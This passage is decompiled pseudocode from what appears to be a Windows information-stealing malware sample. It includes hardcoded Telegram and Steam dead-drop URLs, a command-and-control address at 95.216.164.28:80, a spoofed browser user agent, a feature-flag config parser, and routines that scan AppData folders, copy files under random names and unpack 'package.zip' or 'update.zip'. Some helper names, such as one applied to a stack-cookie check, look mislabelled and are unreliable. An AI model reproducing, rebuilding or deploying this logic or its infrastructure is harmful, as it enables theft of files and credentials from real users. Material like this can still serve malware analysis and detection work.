  *puVar3 = 1;
  puVar3[1] = puVar1;
  *in_FS_OFFSET = local_10;
  return puVar3;
}



void FUN_0038e6e0(void)

{
  void *unaff_ESI;
  
  if (*(void **)((int)unaff_ESI + 0x138) != (void *)0x0) {
    FUN_003b14b9(*(void **)((int)unaff_ESI + 0x138));
  }
  *(undefined4 *)((int)unaff_ESI + 0x138) = 0;
  if (*(void **)((int)unaff_ESI + 0x13c) != (void *)0x0) {
    FUN_003b14b9(*(void **)((int)unaff_ESI + 0x13c));
  }
  *(undefined4 *)((int)unaff_ESI + 0x13c) = 0;
  FUN_003aee4b(unaff_ESI);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_0038e730(undefined4 param_1,undefined4 param_2,char *param_3,uchar *param_4)

{
  uchar *puVar1;
  uchar uVar2;
  int iVar3;
  char *pcVar4;
  byte *pbVar5;
  int iVar6;
  uchar *puVar7;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  uchar *puVar8;
  undefined8 uVar9;
  char **in_stack_fffffca8;
  char **ppcVar10;
  int local_354;
  char local_34d;
  undefined4 local_34c [66];
  uint local_244;
  undefined local_240 [8];
  undefined local_238 [8];
  undefined local_230 [20];
  undefined local_21c [264];
  uchar local_114 [268];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  if (DAT_003d92dc == (int *)0x0) {
LAB_0038e78c:
    local_354 = 0x10000;
    goto LAB_0038e9d7;
  }
  if (*DAT_003d92dc != 1) {
    local_354 = 0x80000;
    goto LAB_0038e9d7;
  }
  ppcVar10 = (char **)DAT_003d92dc[1];
  in_stack_fffffca8 = ppcVar10;
  if (ppcVar10[1] != (char *)0xffffffff) {
    FUN_0038d870();
    param_2 = extraout_EDX;
  }
  ppcVar10[1] = (char *)0xffffffff;
  if (*(int *)(*ppcVar10 + 4) <= (int)param_3) goto LAB_0038e78c;
  if ((int)param_3 < *(int *)(*ppcVar10 + 0x10)) {
    FUN_0038d060();
  }
  iVar3 = *(int *)(*ppcVar10 + 0x10);
  while (iVar3 < (int)param_3) {
    pcVar4 = *ppcVar10;
    if (((pcVar4 != (char *)0x0) && (*(int *)(pcVar4 + 0x18) != 0)) &&
       (*(int *)(pcVar4 + 0x10) + 1 != *(int *)(pcVar4 + 4))) {
      *(int *)(pcVar4 + 0x10) = *(int *)(pcVar4 + 0x10) + 1;
      *(int *)(pcVar4 + 0x14) =
           *(int *)(pcVar4 + 0x14) +
           *(int *)(pcVar4 + 0x50) + *(int *)(pcVar4 + 0x4c) + 0x2e + *(int *)(pcVar4 + 0x48);
      iVar3 = FUN_0038cc60((int *)(pcVar4 + 0x28),(uint *)(pcVar4 + 0x78),(undefined4 *)0x0,0);
      *(uint *)(pcVar4 + 0x18) = (uint)(iVar3 == 0);
    }
    iVar3 = *(int *)(*ppcVar10 + 0x10);
  }
  FUN_0038d9a0(ppcVar10,local_34c,param_3);
  if ((local_244 >> 4 & 1) != 0) {
    local_354 = 0;
    param_2 = extraout_EDX_00;
    goto LAB_0038e9d7;
  }
  uVar2 = *param_4;
  local_21c[0] = 0;
  puVar7 = param_4;
  puVar8 = param_4;
  while (uVar2 != '\0') {
    if ((uVar2 == '/') || (uVar2 == '\\')) {
      puVar8 = puVar7 + 1;
    }
    puVar1 = puVar7 + 1;
    puVar7 = puVar7 + 1;
    uVar2 = *puVar1;
  }
  __mbsnbcpy(local_114,param_4,0x104);
  if (puVar8 == param_4) {
    local_114[0] = '\0';
LAB_0038e863:
    (*_DAT_003d9374)(local_21c,"%s%s%s",ppcVar10 + 0x50,local_114,puVar8);
  }
  else {
    puVar8[(int)(local_114 + -(int)param_4)] = '\0';
    if (((local_114[0] != '/') && (local_114[0] != '\\')) &&
       ((local_114[0] == '\0' || (local_114[1] != ':')))) goto LAB_0038e863;
    (*_DAT_003d9374)(local_21c,&DAT_003d0954,local_114,puVar8);
  }
  uVar9 = (*_DAT_003d93b4)(local_21c,0x40000000,0,0,2,local_244,0);
  param_2 = (undefined4)((ulonglong)uVar9 >> 0x20);
  iVar3 = (int)uVar9;
  if (iVar3 == -1) {
    local_354 = 0x200;
  }
  else {
    FUN_0038d4a0(ppcVar10[0x4e]);
    ppcVar10 = in_stack_fffffca8;
    if (in_stack_fffffca8[0x4f] == (char *)0x0) {
      pcVar4 = (char *)FUN_003ae40b(0x4000);
      in_stack_fffffca8[0x4f] = pcVar4;
    }
    local_354 = 0;
    do {
      pbVar5 = FUN_0038d610((void *)0x4000,(int)in_stack_fffffca8[0x4f],&local_34d);
      if (pbVar5 == (byte *)0xffffff96) {
        local_354 = 0x1000;
        goto LAB_0038e9a1;
      }
      if ((int)pbVar5 < 0) break;
      if ((0 < (int)pbVar5) &&
         (iVar6 = (*_DAT_003d9420)(iVar3,in_stack_fffffca8[0x4f],pbVar5,&stack0xfffffca8,0),
         iVar6 == 0)) {
        local_354 = 0x400;
        goto LAB_0038e9a1;
      }
      if (local_34d != '\0') goto LAB_0038e9a1;
    } while (pbVar5 != (byte *)0x0);
    local_354 = 0x5000000;
LAB_0038e9a1:
    FUN_0038d870();
    in_stack_fffffca8 = ppcVar10;
    if (local_354 == 0) {
      (*_DAT_003d955c)(iVar3,local_238,local_240,local_230);
      in_stack_fffffca8 = ppcVar10;
    }
    (*_DAT_003d93b8)(iVar3);
    param_2 = extraout_EDX_01;
  }
LAB_0038e9d7:
  _DAT_003d96b0 = local_354;
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,param_2,(char)in_stack_fffffca8);
  return;
}



void FUN_0038ea10(void)

{
  int *piVar1;
  undefined *unaff_ESI;
  
  *(undefined4 *)(unaff_ESI + 0x14) = 0xf;
  *(undefined4 *)(unaff_ESI + 0x10) = 0;
  *unaff_ESI = 0;
  piVar1 = (int *)_strlen("408");
  FUN_003894c0(unaff_ESI,(int **)&DAT_003d0974,piVar1);
  return;
}



void FUN_0038ea50(void)

{
  int *piVar1;
  undefined *unaff_ESI;
  
  *(undefined4 *)(unaff_ESI + 0x14) = 0xf;
  *(undefined4 *)(unaff_ESI + 0x10) = 0;
  *unaff_ESI = 0;
  piVar1 = (int *)_strlen("2.4");
  FUN_003894c0(unaff_ESI,(int **)&DAT_003d0978,piVar1);
  return;
}



void FUN_0038ea90(void)

{
  int *piVar1;
  undefined *unaff_ESI;
  
  *(undefined4 *)(unaff_ESI + 0x14) = 0xf;
  *(undefined4 *)(unaff_ESI + 0x10) = 0;
  *unaff_ESI = 0;
  piVar1 = (int *)_strlen("877");
  FUN_003894c0(unaff_ESI,(int **)&DAT_003d097c,piVar1);
  return;
}



void FUN_0038ead0(void)

{
  int *piVar1;
  undefined *unaff_ESI;
  
  *(undefined4 *)(unaff_ESI + 0x14) = 0xf;
  *(undefined4 *)(unaff_ESI + 0x10) = 0;
  *unaff_ESI = 0;
  piVar1 = (int *)_strlen("https://t.me/gurutist");
  FUN_003894c0(unaff_ESI,(int **)"https://t.me/gurutist",piVar1);
  return;
}



void FUN_0038eb10(void)

{
  int *piVar1;
  undefined *unaff_ESI;
  
  *(undefined4 *)(unaff_ESI + 0x14) = 0xf;
  *(undefined4 *)(unaff_ESI + 0x10) = 0;
  *unaff_ESI = 0;
  piVar1 = (int *)_strlen(
                         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
                         );
  FUN_003894c0(unaff_ESI,
               (int **)
               "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
               ,piVar1);
  return;
}



void FUN_0038eb50(void)

{
  int *piVar1;
  undefined *unaff_ESI;
  
  *(undefined4 *)(unaff_ESI + 0x14) = 0xf;
  *(undefined4 *)(unaff_ESI + 0x10) = 0;
  *unaff_ESI = 0;
  piVar1 = (int *)_strlen("https://steamcommunity.com/profiles/76561199476091435");
  FUN_003894c0(unaff_ESI,(int **)"https://steamcommunity.com/profiles/76561199476091435",piVar1);
  return;
}



void FUN_0038eb90(void)

{
  int *piVar1;
  undefined *unaff_ESI;
  
  *(undefined4 *)(unaff_ESI + 0x14) = 0xf;
  *(undefined4 *)(unaff_ESI + 0x10) = 0;
  *unaff_ESI = 0;
  piVar1 = (int *)_strlen("kebap");
  FUN_003894c0(unaff_ESI,(int **)"kebap",piVar1);
  return;
}



void FUN_0038ebd0(void)

{
  int *piVar1;
  undefined *unaff_ESI;
  
  *(undefined4 *)(unaff_ESI + 0x14) = 0xf;
  *(undefined4 *)(unaff_ESI + 0x10) = 0;
  *unaff_ESI = 0;
  piVar1 = (int *)_strlen("http://95.216.164.28:80");
  FUN_003894c0(unaff_ESI,(int **)"http://95.216.164.28:80",piVar1);
  return;
}



void FUN_0038ec10(void)

{
  int *piVar1;
  undefined *unaff_ESI;
  
  *(undefined4 *)(unaff_ESI + 0x14) = 0xf;
  *(undefined4 *)(unaff_ESI + 0x10) = 0;
  *unaff_ESI = 0;
  piVar1 = (int *)_strlen("package.zip");
  FUN_003894c0(unaff_ESI,(int **)"package.zip",piVar1);
  return;
}



void FUN_0038ec50(void)

{
  int *piVar1;
  undefined *unaff_ESI;
  
  *(undefined4 *)(unaff_ESI + 0x14) = 0xf;
  *(undefined4 *)(unaff_ESI + 0x10) = 0;
  *unaff_ESI = 0;
  piVar1 = (int *)_strlen("update.zip");
  FUN_003894c0(unaff_ESI,(int **)"update.zip",piVar1);
  return;
}



void FUN_0038ec90(void)

{
  int *piVar1;
  undefined *unaff_ESI;
  
  *(undefined4 *)(unaff_ESI + 0x14) = 0xf;
  *(undefined4 *)(unaff_ESI + 0x10) = 0;
  *unaff_ESI = 0;
  piVar1 = (int *)_strlen("");
  FUN_003894c0(unaff_ESI,(int **)&DAT_003ce656,piVar1);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_0038ecd0(undefined4 *param_1)

{
  undefined4 **_Str;
  char *this;
  int iVar1;
  int *piVar2;
  undefined *puVar3;
  ulong uVar4;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 uVar5;
  undefined4 extraout_EDX_01;
  int **in_FS_OFFSET;
  undefined8 uVar6;
  uint in_stack_00000018;
  undefined4 *in_stack_fffff3bc;
  undefined uVar7;
  undefined4 in_stack_fffff3e8;
  char *local_bd8;
  undefined2 local_bd4 [2];
  undefined local_bd0 [1000];
  undefined local_7e8 [1000];
  char local_400;
  char local_3ff;
  char local_3fe;
  char local_3fd;
  char local_3fc;
  undefined local_3fb;
  uint local_18;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &LAB_003c2fb8;
  local_10 = *in_FS_OFFSET;
  local_18 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_8 = 0;
  _DAT_003d96ec = 1;
  trim_string((undefined (*) [16])local_7e8,0,1000);
  local_bd4[0] = 0x3b;
  _Str = (undefined4 **)param_1;
  if (in_stack_00000018 < 0x10) {
    _Str = &param_1;
  }
  this = _strtok_s((char *)_Str,(char *)local_bd4,&local_bd8);
  uVar7 = (undefined)in_stack_fffff3e8;
  uVar5 = extraout_EDX;
  while (this != (char *)0x0) {
    uVar6 = (*_DAT_003d9418)();
    uVar5 = (undefined4)((ulonglong)uVar6 >> 0x20);
    if (5 < (int)uVar6) {
      trim_string((undefined (*) [16])&local_400,0,1000);
      trim_string((undefined (*) [16])local_bd0,0,1000);
      iVar1 = (*_DAT_003d9418)();
      if (iVar1 < 0) {
        local_400 = '\0';
      }
      else {
        local_400 = *this;
        local_3ff = this[1];
        local_3fe = this[2];
        local_3fd = this[3];
        local_3fc = this[4];
        local_3fb = 0;
      }
      (*_DAT_003d95cc)();
      iVar1 = (*_DAT_003d9550)();
      if (iVar1 == 0) {
        in_stack_fffff3bc = (undefined4 *)((uint)in_stack_fffff3bc & 0xffffff00);
        piVar2 = (int *)_strlen("");
        FUN_003894c0(&stack0xfffff3bc,(int **)&DAT_003ce656,piVar2);
        FUN_00399090(local_bd0,in_stack_fffff3bc);
      }
      else {
        (*_DAT_003d9520)();
        puVar3 = (undefined *)_malloc(0x14);
        *puVar3 = 0;
        uVar4 = (*_DAT_003d958c)();
        FUN_003b27b4(uVar4);
        iVar1 = 0x14;
        do {
          FUN_003b27c6();
          (*_DAT_003d9374)();
          iVar1 = iVar1 + -1;
        } while (iVar1 != 0);
        puVar3[0x14] = 0;
        (*_DAT_003d9520)();
        (*_DAT_003d9520)();
        FUN_00398740(this,local_7e8);
        trim_string((undefined (*) [16])&stack0xfffff3e8,0,0x3c);
        in_stack_fffff3bc = (undefined4 *)&stack0xfffff3e8;
        in_stack_fffff3e8 = 0x3c;
        (*_DAT_003d9584)();
        trim_string((undefined (*) [16])&stack0xfffff3e8,0,0x3c);
      }
      trim_string((undefined (*) [16])local_7e8,0,1000);
      trim_string((undefined (*) [16])&local_400,0,1000);
      trim_string((undefined (*) [16])local_bd0,0,1000);
      this = _strtok_s((char *)0x0,(char *)local_bd4,&local_bd8);
      uVar5 = extraout_EDX_00;
    }
    uVar7 = (undefined)in_stack_fffff3e8;
  }
  _DAT_003d96f4 = 1;
  if (0xf < in_stack_00000018) {
    FUN_003aee4b(param_1);
    uVar5 = extraout_EDX_01;
  }
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_18 ^ (uint)&stack0xfffffffc,uVar5,uVar7);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_0038f000(undefined4 param_1)

{
  undefined4 uVar1;
  char *pcVar2;
  int iVar3;
  int iVar4;
  char *local_c;
  undefined2 local_8 [2];
  
  uVar1 = (*_DAT_003d957c)(0,60000);
  pcVar2 = (char *)(*_DAT_003d9504)(uVar1);
  (*_DAT_003d9520)(pcVar2,param_1);
  local_8[0] = 0x2c;
  pcVar2 = _strtok_s(pcVar2,(char *)local_8,&local_c);
  if (pcVar2 != (char *)0x0) {
    iVar4 = 0;
    do {
      switch(iVar4) {
      case 0:
        DAT_003d72c8 = 1;
        break;
      case 1:
        iVar3 = (*_DAT_003d9550)(pcVar2,&DAT_003d0a9c);
        if (iVar3 == 0) {
          DAT_003d96dc = 1;
        }
        break;
      case 2:
        iVar3 = (*_DAT_003d9550)(pcVar2,&DAT_003d0a9c);
        if (iVar3 == 0) {
          DAT_003d96dd = 1;
        }
        break;
      case 3:
        iVar3 = (*_DAT_003d9550)(pcVar2,&DAT_003d0a9c);
        if (iVar3 == 0) {
          DAT_003d96de = 1;
        }
        break;
      case 4:
        iVar3 = (*_DAT_003d9550)(pcVar2,&DAT_003d0a9c);
        if (iVar3 == 0) {
          _DAT_003d96e4 = 1;
        }
        break;
      case 5:
        uVar1 = (*_DAT_003d957c)(0,999999);
        uVar1 = (*_DAT_003d9504)(uVar1);
        DAT_003d92e4 = uVar1;
        goto LAB_0038f1a0;
      case 6:
        iVar3 = (*_DAT_003d9550)(pcVar2,&DAT_003d0a9c);
        if (iVar3 == 0) {
          DAT_003d96e1 = 1;
        }
        break;
      case 7:
        iVar3 = (*_DAT_003d9550)(pcVar2,&DAT_003d0a9c);
        if (iVar3 == 0) {
          DAT_003d96e3 = 1;
        }
        break;
      case 8:
        iVar3 = (*_DAT_003d9550)(pcVar2,&DAT_003d0a9c);
        if (iVar3 == 0) {
          DAT_003d96e8 = 1;
        }
        break;
      case 9:
        iVar3 = (*_DAT_003d9550)(pcVar2,&DAT_003d0a9c);
        if (iVar3 == 0) {
          DAT_003d96e0 = 1;
        }
        break;
      case 10:
        iVar3 = (*_DAT_003d9550)(pcVar2,&DAT_003d0a9c);
        if (iVar3 == 0) {
          DAT_003d96e2 = 1;
        }
        break;
      case 0xb:
        uVar1 = (*_DAT_003d957c)(0,999999);
        uVar1 = (*_DAT_003d9504)(uVar1);
        DAT_003d92d8 = uVar1;
LAB_0038f1a0:
        (*_DAT_003d9520)(uVar1,pcVar2);
      }
      pcVar2 = _strtok_s((char *)0x0,(char *)local_8,&local_c);
      iVar4 = iVar4 + 1;
    } while (pcVar2 != (char *)0x0);
  }
  return;
}



// WARNING: Removing unreachable block (ram,0x0038f675)
// WARNING: Removing unreachable block (ram,0x0038f68d)
// WARNING: Could not reconcile some variable overlaps
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __thiscall FUN_0038f200(void *this,undefined4 param_1)

{
  uint uVar1;
  int iVar2;
  int *piVar3;
  undefined4 *puVar4;
  size_t sVar5;
  undefined4 ****ppppuVar6;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 extraout_EDX_03;
  undefined4 uVar7;
  undefined4 extraout_EDX_04;
  int **in_FS_OFFSET;
  ulonglong uVar8;
  undefined8 uVar9;
  undefined uVar10;
  void *local_ba0;
  uint local_b90;
  void *local_b8c [7];
  void *local_b70;
  undefined4 local_b60;
  uint local_b5c;
  void *local_b54 [4];
  undefined4 local_b44;
  uint local_b40;
  void *local_b38 [4];
  undefined4 local_b28;
  uint local_b24;
  undefined4 ****local_b1c [4];
  undefined4 local_b0c;
  uint local_b08;
  undefined local_b00 [1000];
  undefined local_718 [1000];
  char local_330 [264];
  undefined local_228 [264];
  int *local_120 [66];
  uint local_18;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c4187;
  local_10 = *in_FS_OFFSET;
  uVar1 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_18 = uVar1;
  trim_string((undefined (*) [16])local_228,0,0x104);
  trim_string((undefined (*) [16])local_120,0,0x104);
  trim_string((undefined (*) [16])local_b00,0,1000);
  iVar2 = (*_DAT_003d9500)(0,0x1a,0,0,local_b00,uVar1);
  (*_DAT_003d9520)(local_228,(uint)local_b00 & (iVar2 < 0) - 1);
  (*_DAT_003d9520)(local_228,DAT_003d8dbc);
  (*_DAT_003d9520)(local_120,local_228);
  uVar10 = 0xfc;
  (*_DAT_003d9520)(local_120);
  (*_DAT_003d9520)(local_120,DAT_003d8d54);
  local_b40 = 0xf;
  local_b44 = 0;
  local_b54[0] = (void *)((uint)local_b54[0] & 0xffffff00);
  piVar3 = (int *)_strlen((char *)local_120);
  FUN_003894c0(local_b54,local_120,piVar3);
  local_8 = 0;
  puVar4 = (undefined4 *)FUN_003a58e0();
  if (7 < (uint)puVar4[5]) {
    puVar4 = (undefined4 *)*puVar4;
  }
  uVar8 = (*_DAT_003d9364)(puVar4);
  uVar7 = (undefined4)(uVar8 >> 0x20);
  if (((int)uVar8 == -1) || (local_b90 = 1, (uVar8 & 0x10) != 0)) {
    local_b90 = 0;
  }
  if (7 < local_b5c) {
    FUN_003aee4b(local_b70);
    uVar7 = extraout_EDX;
  }
  local_8 = 0xffffffff;
  local_b5c = 7;
  local_b60 = 0;
  local_b70 = (void *)((uint)local_b70 & 0xffff0000);
  if (0xf < local_b40) {
    FUN_003aee4b(local_b54[0]);
    uVar7 = extraout_EDX_00;
  }
  local_b40 = 0xf;
  local_b44 = 0;
  local_b54[0] = (void *)((uint)local_b54[0] & 0xffffff00);
  if (local_b90 != 0) {
    uVar9 = FUN_00399d30(local_120);
    uVar7 = (undefined4)((ulonglong)uVar9 >> 0x20);
    if ((int)uVar9 != 0) {
      local_b24 = 0xf;
      local_b28 = 0;
      local_b38[0] = (void *)((uint)local_b38[0] & 0xffffff00);
      piVar3 = (int *)_strlen((char *)this);
      FUN_003894c0(local_b38,(int **)this,piVar3);
      local_8 = 1;
      FUN_003a5430(local_b1c,local_b38);
      local_8._0_1_ = 3;
      if (0xf < local_b24) {
        FUN_003aee4b(local_b38[0]);
      }
      local_b24 = 0xf;
      local_b28 = 0;
      local_b38[0] = (void *)((uint)local_b38[0] & 0xffffff00);
      trim_string((undefined (*) [16])local_330,0,0x104);
      (*_DAT_003d9520)(local_330,DAT_003d8a94);
      sVar5 = _strlen(local_330);
      uVar1 = FUN_003959f0(local_b1c,local_330,sVar5);
      uVar7 = extraout_EDX_01;
      if (uVar1 != 0xffffffff) {
        FUN_003898c0(local_b1c,(int *)0x0,uVar1 + 0xc);
        FUN_003898c0(local_b1c,(int *)0x78,0xffffffff);
        iVar2 = FUN_00399be0();
        uVar7 = extraout_EDX_02;
        if (iVar2 != 0) {
          trim_string((undefined (*) [16])local_718,0,1000);
          puVar4 = (undefined4 *)FUN_00399f60(local_ba0,local_b90,0,0);
          local_8._0_1_ = 4;
          if (0xf < (uint)puVar4[5]) {
            puVar4 = (undefined4 *)*puVar4;
          }
          (*_DAT_003d9520)(local_718,puVar4);
          local_8._0_1_ = 3;
          FUN_00389360(local_b8c);
          (*_DAT_003d9520)(param_1,DAT_003d8f1c);
          iVar2 = (*_DAT_003d9550)(local_718,&DAT_003d0aa0);
          if (iVar2 == 0) {
            ppppuVar6 = local_b1c[0];
            if (local_b08 < 0x10) {
              ppppuVar6 = local_b1c;
            }
            (*_DAT_003d9520)(param_1,ppppuVar6);
          }
          else {
            puVar4 = (undefined4 *)FUN_00399f60(local_ba0,local_b90,0,0);
            local_8._0_1_ = 5;
            if (0xf < (uint)puVar4[5]) {
              puVar4 = (undefined4 *)*puVar4;
            }
            (*_DAT_003d9520)(param_1,puVar4);
            local_8._0_1_ = 3;
            FUN_00389360(local_b8c);
          }
          (*_DAT_003d9520)(param_1,&DAT_003ce668);
          uVar7 = extraout_EDX_03;
        }
      }
      local_8 = 0xffffffff;
      if (0xf < local_b08) {
        FUN_003aee4b(local_b1c[0]);
        uVar7 = extraout_EDX_04;
      }
      local_b08 = 0xf;
      local_b0c = 0;
      local_b1c[0] = (undefined4 ****)((uint)local_b1c[0] & 0xffffff00);
    }
  }
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_18 ^ (uint)&stack0xfffffffc,uVar7,uVar10);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_0038f6b0(void *param_1)

{
  undefined4 uVar1;
  int iVar2;
  undefined *puVar3;
  ulong uVar4;
  uint uVar5;
  int iVar6;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  int **in_FS_OFFSET;
  undefined8 uVar7;
  uint in_stack_00000018;
  undefined uVar8;
  undefined4 uVar9;
  int local_57c;
  undefined local_578 [44];
  undefined local_54c [276];
  undefined local_438 [264];
  undefined local_330 [264];
  undefined local_228 [264];
  undefined local_120 [264];
  uint local_18;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &LAB_003c44b8;
  local_10 = *in_FS_OFFSET;
  local_18 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  uVar9 = 0;
  local_8 = 0;
  uVar1 = (*_DAT_003d957c)(0,9999999,local_18);
  local_57c = (*_DAT_003d9504)(uVar1);
  (*_DAT_003d9374)(local_330,&DAT_003d0aa8);
  uVar7 = (*_DAT_003d95e0)(local_330,local_578);
  uVar1 = (undefined4)((ulonglong)uVar7 >> 0x20);
  iVar6 = (int)uVar7;
  uVar8 = (undefined)uVar9;
  if (iVar6 != -1) {
    do {
      iVar2 = (*_DAT_003d9550)(local_54c,&DAT_003d0ab0);
      if ((iVar2 != 0) && (iVar2 = (*_DAT_003d9550)(local_54c,&DAT_003d0ab4), iVar2 != 0)) {
        (*_DAT_003d9374)(local_438,"%s\\%s");
        trim_string((undefined (*) [16])local_120,0,0x104);
        (*_DAT_003d9520)(local_120,DAT_003d9098);
        puVar3 = (undefined *)_malloc(0x1a);
        *puVar3 = 0;
        uVar4 = (*_DAT_003d958c)();
        FUN_003b27b4(uVar4);
        iVar2 = 0x1a;
        do {
          uVar5 = FUN_003b27c6();
          (*_DAT_003d9374)(puVar3,&DAT_003d1ad4,puVar3,(int)uVar5 % 10);
          iVar2 = iVar2 + -1;
        } while (iVar2 != 0);
        puVar3[0x1a] = 0;
        (*_DAT_003d9520)(local_120,puVar3);
        (*_DAT_003d93c8)(local_438,local_120,1);
        FUN_0038f200(local_120,local_57c);
        (*_DAT_003d9424)(local_120);
      }
      iVar2 = (*_DAT_003d9438)(iVar6,local_578);
      uVar8 = (undefined)uVar9;
    } while (iVar2 != 0);
    (*_DAT_003d93a8)(iVar6);
    trim_string((undefined (*) [16])local_228,0,0x104);
    (*_DAT_003d9520)(local_228,DAT_003d928c);
    iVar6 = (*_DAT_003d9418)(local_57c);
    if (DAT_003d92ec == (int *)0x0) {
      _DAT_003d9814 = 0x10000;
    }
    else {
      if (*DAT_003d92ec == 2) {
        _DAT_003d9814 = FUN_003ad750((char **)DAT_003d92ec[1],local_57c,local_228,iVar6,3);
      }
      else {
        _DAT_003d9814 = 0x80000;
      }
    }
    trim_string((undefined (*) [16])&local_57c,0,4);
    uVar1 = extraout_EDX;
  }
  if (0xf < in_stack_00000018) {
    FUN_003aee4b(param_1);
    uVar1 = extraout_EDX_00;
  }
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_18 ^ (uint)&stack0xfffffffc,uVar1,uVar8);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0038f930(void)

{
  uint uVar1;
  int *piVar2;
  undefined4 extraout_EDX;
  uint in_stack_ffffdbd0;
  void *pvVar3;
  uint in_stack_ffffdbd4;
  undefined uVar4;
  undefined local_2334 [1000];
  undefined local_1f4c [1000];
  undefined local_1b64 [1000];
  undefined local_177c [1000];
  undefined local_1394 [1000];
  int *local_fac [250];
  undefined local_bc4 [1000];
  undefined local_7dc [1000];
  undefined local_3f4 [1004];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  trim_string((undefined (*) [16])local_fac,0,1000);
  trim_string((undefined (*) [16])local_177c,0,1000);
  trim_string((undefined (*) [16])local_1b64,0,1000);
  trim_string((undefined (*) [16])local_1f4c,0,1000);
  trim_string((undefined (*) [16])local_2334,0,1000);
  trim_string((undefined (*) [16])local_3f4,0,1000);
  trim_string((undefined (*) [16])local_bc4,0,1000);
  trim_string((undefined (*) [16])local_7dc,0,1000);
  trim_string((undefined (*) [16])local_1394,0,1000);
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  uVar4 = 0x6c;
  (*_DAT_003d9520)();
  uVar1 = (*_DAT_003d9470)();
  if ((uVar1 != 0xffffffff) && ((uVar1 & 0x10) == 0)) {
    pvVar3 = (void *)(in_stack_ffffdbd4 & 0xffffff00);
    piVar2 = (int *)_strlen((char *)local_fac);
    FUN_003894c0(&stack0xffffdbd4,local_fac,piVar2);
    in_stack_ffffdbd0 = 0x38fc36;
    FUN_0038f6b0(pvVar3);
  }
  uVar1 = (*_DAT_003d9470)();
  if ((uVar1 != 0xffffffff) && ((uVar1 & 0x10) == 0)) {
    pvVar3 = (void *)(in_stack_ffffdbd0 & 0xffffff00);
    piVar2 = (int *)_strlen((char *)local_fac);
    FUN_003894c0(&stack0xffffdbd0,local_fac,piVar2);
    FUN_0038f6b0(pvVar3);
  }
  trim_string((undefined (*) [16])local_fac,0,1000);
  trim_string((undefined (*) [16])local_177c,0,1000);
  trim_string((undefined (*) [16])local_1b64,0,1000);
  trim_string((undefined (*) [16])local_1f4c,0,1000);
  trim_string((undefined (*) [16])local_2334,0,1000);
  trim_string((undefined (*) [16])local_3f4,0,1000);
  trim_string((undefined (*) [16])local_bc4,0,1000);
  trim_string((undefined (*) [16])local_7dc,0,1000);
  trim_string((undefined (*) [16])local_1394,0,1000);
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,extraout_EDX,uVar4);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0038fd70(void)

{
  int iVar1;
  undefined4 extraout_EDX;
  undefined uVar2;
  undefined local_bc4 [1000];
  undefined local_7dc [1000];
  undefined local_3f4 [1004];
  uint local_8;
  undefined *puVar3;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  trim_string((undefined (*) [16])local_3f4,0,1000);
  trim_string((undefined (*) [16])local_bc4,0,1000);
  (*_DAT_003d9520)(local_bc4,DAT_003d8dbc);
  trim_string((undefined (*) [16])local_7dc,0,1000);
  iVar1 = (*_DAT_003d9500)(0,0x1a,0,0,local_7dc);
  (*_DAT_003d9520)(local_3f4,(iVar1 < 0) - 1 & (uint)local_7dc);
  puVar3 = local_3f4;
  (*_DAT_003d9520)(puVar3,local_bc4);
  uVar2 = SUB41(puVar3,0);
  FUN_0038f930();
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,extraout_EDX,uVar2);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0038fe40(void)

{
  undefined4 extraout_EDX;
  undefined4 uVar1;
  undefined *unaff_EBX;
  undefined8 uVar2;
  undefined uVar3;
  int *local_56c;
  code **local_568;
  undefined local_564 [320];
